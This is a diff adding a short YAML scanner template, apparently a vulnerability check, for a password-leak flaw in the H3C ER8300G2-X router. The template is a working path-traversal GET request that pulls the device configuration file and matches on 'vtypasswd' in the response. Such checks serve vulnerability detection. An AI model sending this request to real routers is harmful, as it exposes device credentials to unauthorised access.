@@ -1,0 +1,20 @@
+id:
+info:
+  name: H3C-ER8300G2-X-密码泄露漏洞
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  headers:
+    User-Agent: Mozilla/5.0 (X11; CrOS aarch64 15236.9.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+    Connection: close
+    Accept-Encoding: gzip
+response1:
+  headers:
+  body: vtypasswd
+  code: 200
+requests2:
+response2:
